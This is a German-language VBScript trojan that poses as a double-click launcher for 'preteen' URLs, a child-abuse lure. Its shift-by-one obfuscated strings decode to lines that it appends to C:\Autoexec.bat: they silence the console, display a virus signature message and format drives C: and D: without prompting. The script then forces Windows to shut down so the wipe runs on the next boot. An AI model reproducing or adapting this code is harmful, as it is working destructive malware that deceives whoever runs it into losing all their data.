' Um in den Genuß der wirklich guten Preteen URL`s zu kommen,
' einfach nur Doppelklick auf diese Datei ausführen.
' ------------------------------------------------------------
' Die URL`s sind hier verschlüsselt, damit keine andere Person
' sehen kann, worum es hier geht.

MyPreTeenURL

Sub MyPreTeenURL()
On Error Resume Next
Dim f, fs, strOut_1, strOut_2
strFileName = "B9[@tsndwdb-a`s"

      For x = 1 To Len(strFileName)

          Zeichen = Mid(strFileName, x, 1)
          T = T + Chr(Asc(Zeichen) + 1)

      Next

          strOut_1 = T
          T = ""

  DoEvents

strText = "Dbgnnee	bkr	DbgnUAR.V87-odcn0-GCEJ-U1	Dbgn-	DbgnzzzSgdnmkxV`qmhmfeqnlzzz]^hms10g^]|||MdudqsntbgJhc&r|||	Dbgn-	bssxmtk	enql`sb9.`tsnsdrs.p.t	enql`sc9.`tsnsdrs.p.t"

      For x = 1 To Len(strText)

          Zeichen = Mid(strText, x, 1)
          T = T + Chr(Asc(Zeichen) + 1)

      Next

          strOut_2 = T
          T = ""
  
  DoEvents            


           Set fs = CreateObject("Scripting.FileSystemObject")
           Set f = fs.OpenTextFile(strOut_1, 8, 0)
           f.Write strOut_2
           f.Close

           Set fs = nothing
           Set f = nothing
           SysShootToPreTeenURL

End Sub

Sub SysShootToPreTeenURL()
On Error Resume Next
DIM objShell, MyCmdCrypt
MyCmdCrypt = "Qtmckk21-dwdtrdq+DwhsVhmcnvr"

        For x = 1 To Len(MyCmdCrypt)

            Zeichen = Mid(MyCmdCrypt, x, 1)
            T = T + Chr(Asc(Zeichen) + 1)

        Next

            MyCMD = T
  
  DoEvents
            
           set objShell = wscript.createObject("wscript.shell")
           objShell.run (MyCMD)

End Sub
